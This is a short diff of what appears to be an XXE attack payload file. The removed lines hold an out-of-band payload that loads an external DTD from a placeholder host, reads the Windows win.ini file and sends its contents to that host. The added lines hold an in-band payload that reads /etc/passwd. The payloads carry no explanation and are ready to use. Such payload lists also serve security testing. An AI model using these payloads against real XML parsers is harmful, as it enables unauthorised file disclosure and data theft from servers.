@@ -1,13 +1,4 @@
-<?xml version="1.0" ?>
-<!DOCTYPE r [
-<!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
-%sp;
-%param1;
-]>
-<r>&exfil;</r>
-
-## External dtd: ##
-
-<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
